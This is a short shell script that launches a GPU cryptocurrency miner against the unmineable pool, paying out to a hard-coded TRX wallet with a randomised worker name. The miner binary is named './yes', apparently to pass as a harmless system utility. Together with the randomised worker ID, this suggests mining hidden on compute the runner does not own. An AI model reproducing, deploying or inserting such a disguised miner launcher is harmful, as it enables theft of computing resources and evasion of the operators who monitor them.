POOL=rx-us.unmineable.com:3333
WALLET=TRX:TTzFKdHwGYw1FfikTj48LJPeHGXcyRMucF
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo b7KPB8h6-$(shuf -i 1911-129020 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
